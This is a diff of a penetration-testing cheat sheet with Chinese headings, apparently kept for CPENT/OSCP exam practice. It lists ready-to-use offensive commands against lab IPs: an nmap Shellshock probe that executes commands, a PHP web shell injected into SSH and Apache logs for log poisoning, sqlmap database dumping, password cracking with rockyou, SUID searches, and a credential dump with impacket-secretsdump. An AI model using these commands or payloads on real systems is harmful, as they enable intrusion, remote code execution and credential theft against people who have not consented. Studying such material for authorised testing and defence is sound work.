@@ -3,6 +3,7 @@ Markdown語法：https://hackmd.io/@eMP9zQQ0Qt6I8Uqp2Vqy6w/SyiOheL5N/%2FBVqowKsh
 https://blog.stevenyu.tw/2022/06/10/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90-cpent-%E8%80%83%E8%A9%A6%E5%BF%83%E5%BE%97%E3%80%81%E4%BB%A5%E5%8F%8A%E8%88%87-oscp-%E7%9A%84%E6%AF%94%E8%BC%83/  
 # NMAP Reacon   
 nmap -sS -n -p 445 --script smb-protocls 192.168.1.1   
+nmap --script http-shellshock --script-args uri=/cbi-bin/keygen,cmd=ls 192.168.1.1
 
 # AD Reacon   
 ## Commands on Windows   
@@ -58,7 +59,8 @@ search /bin/sh
 # Privilege Escalation   
 ## Overlay   
 https://github.com/briskets/CVE-2021-3493  
-
+## Shellshock  
+CVE-2014-6271  
 
 # Firmware Analyze  
 ## binwalk  
@@ -111,7 +113,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>
 ```sqlmap -u "www.example.com" --cooikes=<cookies>  -p '[vuln field name]' --dbs  ```  
 
 # Log Poison   
-## SSH Log (/var/log/auth.log)   
+## SSH Log (/var/log/auth.log) (/var/log/secure)     
 ```ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.1  ```
 ``` ssh -l '<?php system($_GET["cmd"]); ?>'@192.168.1.1  ```  
 ## Apache Log (/var/log/apache2/access.log)  
@@ -133,6 +135,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>
 ## Wordpress Manual Attack  
 http://192.168.1.1/wp-content/themes/twentyfifteen/404.php  
 
+
 # Open Source Target   
 ## http://testphp.vulnweb.com/  
 
@@ -148,3 +151,14 @@ http://192.168.1.1/wp-content/themes/twentyfifteen/404.php
 
 # Credential dump  
 ##  sudo impacket-secretdump htb/kali:kali123@10.10.10.161
+
+# 找檔案  
+## Windows  
+## Linux  
+find / -iname <string> -type f
+find / -perm 4000
+
+# Web REF  
+## exploit db  
+https://www.exploit-db.com/  
+## PayallThins
